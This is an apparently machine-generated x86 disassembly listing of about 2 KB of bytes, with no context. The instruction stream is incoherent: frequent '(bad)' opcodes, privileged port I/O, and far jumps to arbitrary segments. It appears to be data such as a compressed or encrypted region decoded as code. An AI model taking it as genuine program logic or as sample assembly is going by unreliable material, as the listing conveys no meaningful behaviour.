  4121d4:	aaa    
  4121d5:	fisttp WORD PTR [edx-0x37]
  4121d8:	lds    eax,FWORD PTR [edx]
  4121da:	stos   DWORD PTR es:[edi],eax
  4121db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121dc:	lahf   
  4121dd:	fistp  QWORD PTR [ecx]
  4121df:	js     0x412230
  4121e1:	or     eax,0xddd707a0
  4121e6:	test   DWORD PTR [eax],eax
  4121e8:	push   ecx
  4121e9:	push   eax
  4121ea:	aad    0xa5
  4121ec:	aad    0x15
  4121ee:	dec    edx
  4121ef:	clc    
  4121f0:	mov    edi,0xef6cf484
  4121f5:	in     al,dx
  4121f6:	and    DWORD PTR [eax+ecx*1-0x47],edi
  4121fa:	jno    0x412225
  4121fc:	outs   dx,BYTE PTR ds:[esi]
  4121fd:	jb     0x4121dd
  4121ff:	sbb    al,0xe6
  412201:	call   0x52db:0x4bb7220e
  412208:	mov    ch,0x3a
  41220a:	ds push edi
  41220c:	xchg   ebx,eax
  41220d:	add    dh,BYTE PTR [edx-0x5c]
  412210:	(bad)  
  412211:	sbb    bh,dl
  412213:	xchg   edx,eax
  412214:	adc    al,0x4c
  412216:	and    ah,BYTE PTR [ebx-0x4a]
  412219:	call   DWORD PTR [ebx]
  41221b:	gs mov edx,0xed9cafa9
  412221:	mov    ch,0xf9
  412223:	outs   dx,BYTE PTR cs:[esi]
  412225:	push   ecx
  412226:	jmp    0x412268
  412228:	daa    
  412229:	rol    ch,0x35
  41222c:	adc    bl,dl
  41222e:	mov    dl,0x57
  412230:	pop    ss
  412231:	cmovb  esp,DWORD PTR [esi+esi*8]
  412235:	mov    ebp,DWORD PTR cs:0xf8a57a96
  41223c:	cmc    
  41223d:	repnz and eax,0xf62fe26a
  412243:	mov    ah,0x66
  412245:	hlt    
  412246:	jo     0x412262
  412248:	retf   0xb52a
  41224b:	sub    bl,BYTE PTR [edi]
  41224d:	mov    al,0x66
  41224f:	lds    esi,FWORD PTR es:[ecx+eax*2]
  412253:	and    al,0xf
  412255:	mov    esi,0xf4327012
  41225a:	fst    DWORD PTR [edi+0x62]
  41225d:	fdiv   DWORD PTR [esi+0x7a09424f]
  412263:	add    dl,BYTE PTR [ecx+0x3e0be717]
  412269:	daa    
  41226a:	xlat   BYTE PTR ds:[ebx]
  41226b:	test   WORD PTR [edi+0x49],sp
  41226f:	test   al,bh
  412271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412272:	inc    eax
  412273:	adc    al,0x8a
  412275:	push   ebp
  412276:	mov    ecx,0x320ba827
  41227b:	xor    cl,dh
  41227d:	imul   esi,DWORD PTR [ebp-0x76605560],0x38be18e2
  412287:	sbb    BYTE PTR [ecx],bh
  412289:	out    dx,al
  41228a:	mov    esp,0xd5bdd36f
  41228f:	out    0x35,al
  412291:	jo     0x412304
  412293:	jle    0x4122c3
  412295:	int    0xf2
  412297:	mov    esi,DWORD PTR [edi]
  412299:	or     BYTE PTR [esi-0x17],dl
  41229c:	ret    
  41229d:	call   0x54c5:0x54af84fb
  4122a4:	clc    
  4122a5:	inc    ecx
  4122a6:	cmc    
  4122a7:	mov    edx,0xa1f7de90
  4122ac:	rol    ebp,0x57
  4122af:	xchg   edx,eax
  4122b0:	jle    0x412276
  4122b2:	sbb    ebx,DWORD PTR [ecx]
  4122b4:	rcr    DWORD PTR [ebx+0x5d00b205],0x76
  4122bb:	mov    ds:0xd05c3369,al
  4122c0:	jmp    0x76903648
  4122c5:	(bad)  
  4122c6:	fwait
  4122c7:	mov    ah,0xb5
  4122c9:	jmp    0xec86:0x13ec0af2
  4122d0:	push   0x2566902b
  4122d5:	call   0x841b:0xbee842bc
  4122dc:	enter  0xa5c1,0x38
  4122e0:	push   0xd8406e60
  4122e5:	mov    es,WORD PTR [ecx-0x2a]
  4122e8:	jmp    0xf1fd:0xab2f0b7c
  4122ef:	pushf  
  4122f0:	bound  edi,QWORD PTR [edi-0x5c]
  4122f3:	mov    ?,WORD PTR [edi]
  4122f5:	aad    0x22
  4122f7:	mov    ?,ecx
  4122f9:	mov    ?,esi
  4122fb:	cs push esi
  4122fd:	push   0xe9b74daf
  412302:	jp     0x412364
  412304:	bound  ebp,QWORD PTR [eax+0x555a140c]
  41230a:	test   eax,0x8fbe5707
  41230f:	sahf   
  412310:	mov    ecx,0x2b516bff
  412315:	out    dx,al
  412316:	mov    esp,0x437224d0
  41231b:	pop    edx
  41231c:	int    0x94
  41231e:	xchg   DWORD PTR [eax],ecx
  412320:	bound  ebx,QWORD PTR fs:[esi+edi*2+0x36]
  412325:	push   edx
  412326:	adc    DWORD PTR [ecx-0x57],esp
  412329:	add    DWORD PTR [ebx-0x5a],ecx
  41232c:	push   esp
  41232d:	jne    0x412312
  41232f:	jp     0x412365
  412331:	scas   al,BYTE PTR es:[edi]
  412332:	and    BYTE PTR [edi-0x72e5d3b5],0xa2
  412339:	add    ecx,DWORD PTR [edi]
  41233b:	adc    eax,DWORD PTR [eax]
  41233d:	enter  0xe40f,0x38
  412341:	sub    dh,0xda
  412344:	les    ebx,FWORD PTR [ebx-0x65621780]
  41234a:	cwde   
  41234b:	add    eax,0x721e9181
  412350:	mov    gs,WORD PTR [ebx-0x49]
  412353:	mov    edx,ecx
  412355:	pop    ebp
  412356:	hlt    
  412357:	sub    bl,BYTE PTR [eax+0x7abc3524]
  41235d:	lods   eax,DWORD PTR ds:[esi]
  41235e:	fstp   TBYTE PTR ss:[edx-0x206be74f]
  412365:	xor    DWORD PTR [esi+eiz*1-0x66],edx
  412369:	xchg   ebx,eax
  41236a:	fst    DWORD PTR [ebx+0x7aa33dde]
  412370:	fwait
  412371:	loop   0x412341
  412373:	add    ah,BYTE PTR [esi+0x5700a27e]
  412379:	jp     0x4122fc
  41237b:	jb     0x4123bf
  41237d:	mov    bl,0xb5
  41237f:	inc    esp
  412380:	and    BYTE PTR [esi],bl
  412382:	out    dx,eax
  412383:	cmp    eax,0x406fae8b
  412388:	and    BYTE PTR [ebp+0x2a],ah
  41238b:	fnstcw WORD PTR [ebx]
  41238d:	xchg   ebp,eax
  41238e:	ror    DWORD PTR [ebx-0x6a],cl
  412391:	sti    
  412392:	xor    DWORD PTR [ebp-0x3f],eax
  412395:	jno    0x41232b
  412397:	test   al,0x5b
  412399:	cli    
  41239a:	or     eax,0xab3fa6ec
  41239f:	scas   eax,DWORD PTR es:[edi]
  4123a0:	cmp    ebp,DWORD PTR [edx-0x18]
  4123a3:	jbe    0x4123c8
  4123a5:	fs push edx
  4123a7:	mov    bl,0x58
  4123a9:	pop    esi
  4123aa:	fst    QWORD PTR [ebx+0x7543ba27]
  4123b0:	mov    edi,0xfada1a7a
  4123b5:	push   ds
  4123b6:	sbb    BYTE PTR [esi+edx*8-0x4a],bl
  4123ba:	loop   0x4123ac
  4123bc:	in     al,dx
  4123bd:	(bad)  
  4123bf:	pop    ss
  4123c0:	pop    ebp
  4123c1:	pop    edi
  4123c2:	xor    eax,0x8a634741
  4123c7:	xchg   esp,eax
  4123c8:	or     BYTE PTR [esi-0x20239878],ch
  4123ce:	sbb    BYTE PTR [ebp+esi*8-0x3],bh
  4123d2:	xor    eax,0xa0591670
  4123d7:	rcr    edx,1
  4123d9:	or     DWORD PTR [esi-0x274c9a5e],ecx
  4123df:	sbb    eax,0xa5cfa532
  4123e4:	push   ss
  4123e5:	xchg   ecx,eax
  4123e6:	jae    0x4123e5
  4123e8:	or     eax,0x4e3b73f
  4123ed:	(bad)  
  4123ee:	out    dx,eax
  4123ef:	js     0x4123a2
  4123f1:	lods   eax,DWORD PTR ds:[esi]
  4123f2:	retf   
  4123f3:	(bad)  
  4123f4:	pusha  
  4123f5:	sub    BYTE PTR [ecx],0x2
  4123f8:	mov    BYTE PTR [esi],cl
  4123fa:	ds mov al,0xee
  4123fd:	and    eax,0x30f7a998
  412402:	pop    esp
  412403:	in     al,0xa6
  412405:	repnz and DWORD PTR [ecx+ecx*4+0x52],ebp
  41240a:	mov    al,bl
  41240c:	inc    edx
  41240d:	addr16 inc ebx
  41240f:	loopne 0x41246f
  412411:	jns    0x412466
  412413:	pop    ss
  412414:	pop    ebp
  412415:	fiadd  DWORD PTR [eax-0x2d]
  412418:	ret    0xe0e5
  41241b:	cmc    
  41241c:	xchg   ebx,eax
  41241d:	outs   dx,DWORD PTR ds:[esi]
  41241e:	lahf   
  41241f:	(bad)
  412423:	and    al,0x34
  412425:	retf   
  412426:	add    al,0x2a
  412428:	les    esp,FWORD PTR [ebx+ebp*2+0x3d144414]
  41242f:	jecxz  0x4124ab
  412431:	push   esi
  412432:	fadd   st,st(6)
  412434:	jns    0x4123be
  412436:	out    0x5b,al
  412438:	xchg   edx,eax
  412439:	mov    cl,0x77
  41243b:	pop    es
  41243c:	xchg   ebx,ecx
  41243e:	mov    ebx,0x2de02a78
  412443:	xor    al,0xe0
  412445:	cmp    BYTE PTR [ebp+0x2d],bl
  412448:	push   esi
  412449:	pop    esp
  41244a:	lahf   
  41244b:	pop    esi
  41244c:	mov    ch,0xf4
  41244e:	dec    ecx
  41244f:	mov    al,ds:0x481537b2
  412454:	adc    ch,cl
  412456:	push   ss
  412457:	stc    
  412458:	pop    ebx
  412459:	cmp    ecx,DWORD PTR [edx-0x17]
  41245c:	call   0xb5c10124
  412461:	sahf   
  412462:	dec    ebx
  412463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412464:	jmp    0x1f6b8339
  412469:	test   esp,esp
  41246b:	xchg   ecx,eax
  41246c:	mov    eax,0xbc689aa8
  412471:	aad    0x2a
  412473:	lahf   
  412474:	adc    eax,0xf84a056e
  412479:	cld    
  41247a:	test   ebp,esi
  41247c:	test   eax,0x8b645273
  412481:	push   esp
  412482:	test   DWORD PTR [edi],esp
  412484:	xchg   ecx,eax
  412485:	and    esp,DWORD PTR [edx+0x2a]
  412488:	dec    eax
  412489:	mov    ebp,0x1ea1c349
  41248e:	leave  
  41248f:	add    al,0xe5
  412491:	inc    edx
  412492:	(bad)  
  412493:	jp     0x412503
  412495:	jno    0x4124aa
  412497:	mov    esi,0x173b7fce
  41249c:	pop    es
  41249d:	outs   dx,BYTE PTR ds:[esi]
  41249e:	stos   BYTE PTR es:[edi],al
  41249f:	int    0xa2
  4124a1:	push   ds
  4124a2:	push   ds
  4124a3:	rcr    DWORD PTR [edi+0x5b],cl
  4124a6:	or     al,0xb
  4124a8:	std    
  4124a9:	pop    di
  4124ab:	mov    al,ds:0xf51f2fb
  4124b0:	or     eax,0x763236e4
  4124b5:	mov    dl,0x58
  4124b7:	dec    eax
  4124b8:	or     eax,0x7140e168
  4124bd:	or     eax,DWORD PTR [edi]
  4124bf:	nop
  4124c0:	adc    bl,BYTE PTR [edx]
  4124c2:	sbb    al,0xd2
  4124c4:	mov    esi,0x26dcc568
  4124ca:	lock sub al,0x89
  4124cd:	mov    edi,0xa37717e4
  4124d2:	(bad)  
  4124d3:	jns    0x412461
  4124d5:	cdq    
  4124d6:	aas    
  4124d7:	xchg   edx,eax
  4124d8:	adc    al,0xf0
  4124da:	dec    esp
  4124db:	es mov dl,0x32
  4124de:	fwait
  4124df:	retf   0xe544
  4124e2:	test   al,0xda
  4124e4:	nop
  4124e5:	loopne 0x4124d4
  4124e7:	cli    
  4124e8:	clc    
  4124e9:	jmp    0xdbd8:0xab97bfcc
  4124f0:	sub    edx,ebx
  4124f2:	mov    esi,0xdebad655
  4124f7:	cmp    al,BYTE PTR [ecx-0x6632cdc0]
  4124fd:	xchg   ebx,eax
  4124fe:	cli    
  4124ff:	jnp    0x41256f
  412501:	and    ecx,ebx
  412503:	lods   eax,DWORD PTR ds:[esi]
  412504:	mov    ecx,0x9a03b719
  412509:	push   0xffffffdf
  41250b:	pop    ds
  41250c:	jl     0x4124e9
  41250e:	sti    
  41250f:	not    BYTE PTR [edi+0x2f0e21d4]
  412515:	and    eax,0x9be6792d
  41251a:	inc    edx
  41251b:	add    edi,DWORD PTR [edx-0x57]
  41251e:	pop    edx
  41251f:	fdiv   st(7),st
  412521:	repz xor DWORD PTR [esi-0x2c47af38],edi
  412528:	shr    BYTE PTR [edx+0x7fdd0b4a],0xb4
  41252f:	jmp    0x1706:0x25421199
  412536:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412537:	in     eax,dx
  412538:	out    0xc2,eax
  41253a:	mov    bh,0x99
  41253c:	test   DWORD PTR [edx-0x6e],0x59a41df5
  412543:	mov    dh,0x4b
  412545:	les    eax,FWORD PTR [ebx-0x2b1ef8c]
  41254b:	sar    DWORD PTR [esi+ecx*4-0x3c],0xda
  412550:	rcr    BYTE PTR [esi],cl
  412552:	jno    0x4125ce
  412554:	pusha  
  412555:	adc    cl,BYTE PTR [eiz*4-0x7da30b45]
  41255c:	jle    0x4125b8
  41255e:	jo     0x412581
  412560:	out    0x71,al
  412562:	(bad)  
  412563:	into   
  412564:	bndldx (bad),[esi+esi*1+0x464977bb]
  41256c:	sub    eax,0x8e2602a5
  412571:	mov    eax,ds:0x993dc70a
  412576:	mov    es,WORD PTR [ecx+0x11ec2f62]
  41257c:	popf   
  41257d:	add    DWORD PTR [esi],ecx
  41257f:	sbb    eax,0x9900a76e
  412584:	cmp    BYTE PTR [ebp-0x123a166],al
  41258a:	mov    dh,0x64
  41258c:	mov    ebx,0x58aa19cb
  412591:	mov    al,0x7f
  412593:	mov    eax,0xac6fdcdc
  412598:	cli    
  412599:	sbb    BYTE PTR gs:[esi],0x4a
  41259d:	pop    esp
  41259e:	imul   eax,DWORD PTR [eax],0xffffffd7
  4125a1:	ss (bad) 
  4125a3:	leave  
  4125a4:	fnstenv [ebp+0x20]
  4125a7:	add    DWORD PTR [edi],ecx
  4125a9:	rol    BYTE PTR [ebx+0x5e2a7c33],1
  4125af:	inc    ecx
  4125b0:	repnz popa 
  4125b2:	adc    DWORD PTR [ebx-0x2e],0x40
  4125b6:	aam    0xa9
  4125b8:	pushf  
  4125b9:	add    al,0x46
  4125bb:	mov    WORD PTR [ebp+0x6764008c],?
  4125c1:	imul   esi,ecx,0xffffff8e
  4125c4:	inc    edx
  4125c5:	ror    esp,1
  4125c7:	out    dx,al
  4125c8:	retf   
  4125c9:	mov    bh,0x92
  4125cb:	inc    edi
  4125cc:	mov    DWORD PTR [edi-0xe],ebp
  4125cf:	test   DWORD PTR [esi+0x47],0x541296a2
  4125d6:	cmc    
  4125d7:	shr    BYTE PTR [esi],0x7b
  4125da:	add    al,0x24
  4125dc:	hlt    
  4125dd:	xor    ebp,DWORD PTR [edi-0x6c]
  4125e0:	ins    DWORD PTR es:[edi],dx
  4125e1:	xchg   edi,eax
  4125e2:	jg     0x41258a
  4125e4:	(bad)  
  4125e5:	pop    edx
  4125e6:	inc    ebx
  4125e7:	and    ch,ch
  4125e9:	mov    esp,0xafb2889c
  4125ee:	cmp    eax,DWORD PTR [esi-0x64]
  4125f1:	ds test al,0x96
  4125f4:	(bad)  ds:0x4f4e8651
  4125fa:	mov    bh,0xbc
  4125fc:	hlt    
  4125fd:	ins    BYTE PTR es:[edi],dx
  4125fe:	adc    DWORD PTR [edx+0x6a8d5d42],eax
  412604:	cwde   
  412605:	repnz mov cl,0xff
  412608:	mov    cs,WORD PTR [esi-0x643cd260]
  41260e:	inc    edx
  41260f:	adc    BYTE PTR [ebx],0x16
  412612:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412613:	stos   DWORD PTR es:[edi],eax
  412614:	push   eax
  412615:	popf   
  412616:	das    
  412617:	jp     0x412677
  412619:	or     eax,0x1da91828
  41261e:	or     ah,cl
  412620:	shl    DWORD PTR [edx-0x54],cl
  412623:	fldenv ds:0x26ca11f6
  412629:	(bad)  
  41262a:	or     edx,ebx
  41262c:	in     eax,dx
  41262d:	and    eax,0xb76d111a
  412632:	ins    BYTE PTR es:[edi],dx
  412633:	inc    ebp
  412634:	stc    
  412635:	aas    
  412636:	mul    DWORD PTR [ebp-0x2d655625]
  41263c:	test   DWORD PTR [edi+0x167bf030],eax
  412642:	or     al,0xfe
  412644:	xchg   edx,eax
  412645:	pusha  
  412646:	add    eax,0x94b256fd
  41264b:	repz and ah,ch
  41264e:	or     ch,BYTE PTR [edi-0x60224018]
  412654:	repz add DWORD PTR [esi+0x2cd24d27],0x17
  41265c:	clc    
  41265d:	jne    0x4125e3
  41265f:	lods   eax,DWORD PTR ds:[esi]
  412660:	sahf   
  412661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412662:	std    
  412663:	fist   WORD PTR [edi]
  412665:	les    esp,FWORD PTR [esi+esi*8]
  412668:	fs inc edi
  41266a:	ins    BYTE PTR es:[edi],dx
  41266b:	lea    ecx,[edi+0x6a]
  41266e:	sbb    bh,ah
  412670:	sbb    ch,al
  412672:	jmp    0x5f83:0xe1de69a6
  412679:	lock lock jns 0x412635
  41267d:	(bad)  [ecx+edx*1-0x18ea7f0c]
  412684:	sub    eax,DWORD PTR [edx-0x54]
  412687:	loope  0x41261f
  412689:	mov    bh,al
  41268b:	jge    0x4126db
  41268d:	jnp    0x4126a6
  41268f:	mov    gs,ebx
  412691:	mov    al,0x3e
  412693:	xor    DWORD PTR [ebx+0x77],0xffffff93
  412697:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  412699:	xor    edi,esi
  41269b:	dec    esp
  41269c:	stc    
  41269d:	and    ebp,eax
  41269f:	sbb    al,0xf6
  4126a1:	mov    cl,0x3a
  4126a3:	jecxz  0x412703
  4126a5:	lods   al,BYTE PTR ds:[esi]
  4126a6:	stos   BYTE PTR es:[edi],al
  4126a7:	adc    edi,DWORD PTR [edx]
  4126a9:	xlat   BYTE PTR ds:[ebx]
  4126aa:	mov    bl,0xf4
  4126ac:	rcr    DWORD PTR [eax+0x71013c5f],0xe7
  4126b3:	outs   dx,DWORD PTR ds:[si]
  4126b5:	std    
  4126b6:	xchg   edx,eax
  4126b7:	push   ds
  4126b8:	inc    edi
  4126b9:	icebp  
  4126ba:	cmp    cl,ch
  4126bc:	aas    
  4126bd:	imul   esp,DWORD PTR [edi+0x67c000d5],0x1b38dbf3
  4126c7:	xchg   DWORD PTR [edx+0x6e54e89b],ebp
  4126cd:	cwde   
  4126ce:	cdq    
  4126cf:	sub    cl,0xd0
  4126d2:	loope  0x412672
  4126d4:	jmp    0x412684
  4126d6:	ja     0x412683
  4126d8:	js     0x4126c7
  4126da:	or     dl,BYTE PTR [esi+0x1e041792]
  4126e0:	push   ebx
  4126e1:	inc    ebp
  4126e2:	repnz lods al,BYTE PTR ds:[esi]
  4126e4:	hlt    
  4126e5:	mov    bh,0x2f
  4126e7:	(bad)  
  4126e8:	js     0x412727
  4126ea:	sub    ebx,DWORD PTR [esp+edi*8]
  4126ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126ee:	ss jbe 0x41275f
  4126f1:	sbb    al,0x90
  4126f3:	add    bh,BYTE PTR [ecx]
  4126f5:	inc    esp
  4126f6:	daa    
  4126f7:	jns    0x4126dd
  4126f9:	cmp    al,0x8
  4126fb:	jb     0x412709
  4126fd:	cmp    ebx,DWORD PTR [esi-0x1d]
  412700:	push   cs
  412701:	dec    edx
  412702:	jae    0x41270f
  412704:	pop    es
  412705:	push   ecx
  412706:	leave  
  412707:	mov    ecx,DWORD PTR [ebx]
  412709:	ret    0x1af1
  41270c:	aaa    
  41270d:	lock inc esi
  41270f:	sahf   
  412710:	jle    0x41277b
  412712:	dec    edx
  412713:	ret    
  412714:	pop    eax
  412715:	push   ebx
  412716:	add    DWORD PTR [edi+0x37],ecx
  412719:	retf   0x16c
  41271c:	or     bh,BYTE PTR [ecx]
  41271e:	hlt    
  41271f:	retf   
  412720:	jns    0x412711
  412722:	xchg   ebp,eax
  412723:	push   ds
  412724:	inc    esi
  412725:	pop    ds
  412726:	mov    ds:0x492df8b6,al
  41272b:	(bad)  
  41272c:	jmp    0x52802710
  412731:	mov    ds:0x267dc5f0,al
  412736:	inc    ebx
  412737:	iret   
  412738:	jge    0x412791
  41273a:	add    ebp,DWORD PTR [ecx]
  41273c:	les    eax,FWORD PTR [edi]
  41273e:	aad    0x14
  412740:	dec    ebx
  412741:	push   ds
  412742:	adc    eax,0x364e4674
  412747:	cmp    al,0x4
  412749:	and    esi,DWORD PTR [ecx-0x30]
  41274c:	clc    
  41274d:	mov    ah,bh
  41274f:	push   ecx
  412750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412751:	out    0x95,eax
  412753:	jne    0x4126e6
  412755:	xlat   BYTE PTR ds:[ebx]
  412756:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412757:	adc    DWORD PTR [edi+edx*1-0x21],esi
  41275b:	adc    ah,BYTE PTR [eax-0x1c]
  41275e:	mov    ecx,0x9b84fb24
  412763:	pop    esp
  412764:	bswap  ecx
  412766:	aad    0xfa
  412768:	outs   dx,BYTE PTR ds:[esi]
  412769:	lods   eax,DWORD PTR ds:[esi]
  41276a:	pop    ds
  41276b:	jnp    0x41277c
  41276d:	pop    edx
  41276e:	xchg   ecx,eax
  41276f:	test   BYTE PTR [edx],bl
  412771:	add    eax,0x43c51675
  412776:	adc    eax,0xcf4a4c1d
  41277b:	pop    ds
  41277c:	mov    al,0x5e
  41277e:	imul   esp,DWORD PTR [ecx],0x2d
  412781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412782:	retf   0x8813
  412785:	retf   
  412786:	jmp    0x41278c
  412788:	adc    al,0xce
  41278a:	out    dx,eax
  41278b:	nop
  41278c:	shl    BYTE PTR [ecx+0x4c],1
  41278f:	mov    ds:0x90740c27,eax
  412794:	adc    DWORD PTR [ecx-0x76],0xffffffeb
  412798:	fmul   DWORD PTR [eax]
  41279a:	cmp    al,BYTE PTR ds:[edi]
  41279d:	int3   
  41279e:	push   ecx
  41279f:	mov    ds:0xef62a8cb,eax
  4127a4:	fnsave [esi]
  4127a6:	or     DWORD PTR [esi+0x19],ecx
  4127a9:	cld    
  4127aa:	or     al,0xa9
  4127ac:	aad    0x4f
  4127ae:	jae    0x4127ca
  4127b0:	xchg   BYTE PTR [esi+ebx*4],bh
  4127b3:	adc    eax,0xa5374657
  4127b8:	das    
  4127b9:	rcr    DWORD PTR [edx+0x2f],0xab
  4127bd:	retf   
  4127be:	add    cl,BYTE PTR ds:0x77ffbd31
  4127c4:	and    BYTE PTR [bx-0x6e],cl
  4127c8:	inc    ecx
  4127c9:	mov    ds:0x6b5794f1,al
  4127ce:	mov    bl,0x75
  4127d0:	push   cs
  4127d1:	xchg   ecx,eax
  4127d2:	add    BYTE PTR [edx+0x5],bl
  4127d5:	fwait
  4127d6:	jns    0x412808
  4127d8:	pop    esp
  4127d9:	sub    bh,dh
  4127db:	int    0x23
  4127dd:	dec    edx
  4127de:	loopne 0x412856
  4127e0:	or     al,0x3b
  4127e2:	cmc    
  4127e3:	stos   BYTE PTR es:[edi],al
  4127e4:	ret    0x650
  4127e7:	add    ah,BYTE PTR [ebp-0x65b2d626]
  4127ed:	mov    al,ds:0x1fcf5be4
  4127f2:	xor    BYTE PTR [ebx-0x1d],0xa0
  4127f6:	fbld   TBYTE PTR [ebx+eiz*8+0x57c8e830]
  4127fd:	jae    0x41280a
  4127ff:	pop    edx
  412800:	ja     0x4127d0
  412802:	xor    BYTE PTR [ebx],ch
  412804:	jne    0x4127b8
  412806:	(bad)  
  412808:	inc    eax
  412809:	inc    ebp
  41280a:	out    dx,eax
  41280b:	add    BYTE PTR [edi+0x24],dl
  41280e:	jp     0x412839
  412810:	test   DWORD PTR [ebx+0x3b0e2bfb],edx
  412816:	cmc    
  412817:	pop    ds
  412818:	and    esi,DWORD PTR [ebx-0x583e6d07]
  41281e:	std    
  41281f:	(bad)  
  412820:	ins    BYTE PTR es:[edi],dx
  412821:	add    eax,0x1f5a6658
  412826:	inc    edi
  412827:	sub    ah,ch
  412829:	aaa    
  41282a:	cmc    
  41282b:	jno    0x412825
  41282d:	inc    edi
  41282e:	imul   ebp,ebx,0xb9b34352
  412834:	jmp    0xc7fa:0x8f479e20
  41283b:	push   edi
  41283c:	and    DWORD PTR [edx-0x43acc0dd],ecx
  412842:	cmp    al,0xd1
  412844:	xchg   esi,eax
  412845:	out    0x8b,eax
  412847:	add    BYTE PTR [edx+0x6a0b77fd],bh
  41284d:	icebp  
  41284e:	xchg   ebp,ebx
  412850:	push   esp
  412851:	jle    0x41289b
  412853:	adc    al,0x6b
  412855:	xor    BYTE PTR [edx+eax*2-0x319ed7b5],cl
  41285c:	fbld   TBYTE PTR [ecx-0x6e]
  41285f:	jno    0x4128d5
  412861:	push   ebx
  412862:	pushf  
  412863:	mov    ch,0x4
  412865:	and    ah,BYTE PTR [ebx]
  412867:	mov    BYTE PTR [edx+0x2a],cl
  41286a:	arpl   bp,si
  41286c:	or     al,0x2
  41286e:	fldcw  WORD PTR [ecx+0x53b7f7a6]
  412874:	inc    esi
  412875:	mov    edi,0xfc76a35d
  41287a:	mov    al,ds:0xa0a43923
  41287f:	pop    esp
  412880:	je     0x41289f
  412882:	pop    ebx
  412883:	mov    bh,BYTE PTR [ecx-0x49]
  412886:	fadd   QWORD PTR [edi]
  412888:	inc    eax
  412889:	mov    esp,0x2fb680ab
  41288e:	dec    esp
  41288f:	aad    0xb7
  412891:	sub    al,0x64
  412893:	mov    bl,0x42
  412895:	add    DWORD PTR [ebp-0x31],edx
  412898:	push   ds
  412899:	gs gs sbb al,0x4b
  41289d:	jmp    0xb3ae4f13
  4128a2:	jecxz  0x4128fd
  4128a4:	jnp    0x4128f1
  4128a6:	out    0xe5,eax
  4128a8:	xchg   ebx,eax
  4128a9:	sti    
  4128aa:	mov    edx,0x9975c4f0
  4128af:	inc    edi
  4128b0:	(bad)  
  4128b1:	push   edi
  4128b2:	push   ebx
  4128b3:	push   es
  4128b4:	std    
  4128b5:	repz aaa 
  4128b7:	(bad)  
  4128b8:	cmp    al,0x35
  4128ba:	retf   0xcd6
  4128bd:	lds    esp,FWORD PTR [eax+eiz*4-0x43]
  4128c1:	dec    ecx
  4128c2:	cmp    DWORD PTR [ecx],ecx
  4128c4:	rcl    ah,cl
  4128c6:	cmp    BYTE PTR [ecx],al
  4128c8:	jne    0x412923
  4128ca:	add    esp,DWORD PTR [eax]
  4128cc:	pushf  
  4128cd:	loopne 0x4128dc
  4128cf:	jne    0x412936
  4128d1:	xchg   edx,eax
  4128d2:	leave  
  4128d3:	xchg   ebp,eax
  4128d4:	sbb    ecx,ebx
  4128d6:	call   0xbb678a8f
  4128db:	jge    0x4128d8
  4128dd:	test   BYTE PTR [edi+0x7b],cl
  4128e0:	popa   
  4128e1:	popa   
  4128e2:	mov    ecx,0x28b7666
  4128e7:	std    
  4128e8:	cld    
  4128e9:	cmp    DWORD PTR [esi+0x36db1940],ecx
  4128ef:	mov    ds:0x2398fda8,al
  4128f4:	sbb    ebx,DWORD PTR [eax-0x13d80b60]
  4128fa:	out    0xd3,al
  4128fc:	sbb    dl,cl
  4128fe:	dec    esp
  4128ff:	retf   0xb228
  412902:	dec    esi
  412903:	jbe    0x4128e9
  412905:	sbb    ebp,DWORD PTR [eax-0x27]
  412908:	hlt    
  412909:	mov    cl,0x8c
  41290b:	adc    al,0xab
  41290d:	sub    ecx,edi
  41290f:	mov    eax,ds:0xc989097a
  412914:	mov    eax,ds:0xd63988b2
  412919:	xchg   esp,eax
  41291a:	rcl    DWORD PTR [edx+0x20],0x55
  41291e:	popa   
  41291f:	pop    ss
  412920:	xor    eax,0xc0f7d96c
  412925:	inc    eax
  412926:	std    
  412927:	cld    
  412928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412929:	cmp    eax,DWORD PTR [ebp+esi*8+0x38fd0cbd]
  412930:	pushf  
  412931:	add    ebp,DWORD PTR [ecx-0x3eb0836a]
  412937:	lods   eax,DWORD PTR ds:[esi]
  412938:	adc    BYTE PTR [ecx],al
  41293a:	inc    edx
  41293b:	sbb    al,BYTE PTR [eax-0x75]
  41293e:	mov    DWORD PTR [edi],0xbd474a77
  412944:	sbb    eax,0x6a276e28
  412949:	imul   eax,DWORD PTR [esi-0x23],0x48d2bfc5
  412950:	(bad)  
  412952:	pop    ebx
  412953:	ret    0xb3c7
  412956:	xchg   esi,eax
  412957:	(bad)  
  412959:	(bad)  
  41295a:	into   
  41295b:	std    
  41295c:	and    al,0xe2
  41295e:	ds jns 0x41295b
  412961:	jbe    0x412943
  412963:	test   eax,0x8d6c8f85
  412968:	je     0x4129cf
  41296a:	mov    esi,0xdfc1e797
  41296f:	pop    es
  412970:	and    eax,DWORD PTR [esp+edx*4-0x4c169efa]
  412977:	jecxz  0x41297e
  412979:	adc    edi,esi
  41297b:	pushf  
  41297c:	pusha  
  41297d:	test   DWORD PTR [ebp+0x4f],esp
  412980:	jns    0x64236e49
  412986:	sub    al,0x50
  412988:	ret    0xf7b2
  41298b:	dec    eax
  41298c:	inc    esi
  41298d:	and    DWORD PTR [ebp+0x76],edi
  412990:	ror    DWORD PTR [eax+0x6c],cl
  412993:	and    esp,DWORD PTR [edx+0xa]
  412996:	mov    ds:0x24a704ca,al
  41299b:	shr    BYTE PTR [eax],cl
  41299d:	aas    
  41299e:	dec    esi
  41299f:	(bad)  ds:[esi-0x69]
  4129a3:	scas   al,BYTE PTR es:[edi]
  4129a4:	or     eax,0x51883c50
  4129a9:	jb     0x412980
  4129ab:	(bad)  [edi+0x53]
  4129ae:	add    al,0xa
  4129b0:	cdq    
  4129b1:	call   DWORD PTR [esi]
  4129b3:	test   DWORD PTR [eax-0x2b],0xf8443100
  4129ba:	dec    ebx
  4129bb:	shr    BYTE PTR [ecx],cl
  4129bd:	pop    ebx
  4129be:	repnz xor eax,0x9b9a9f2c
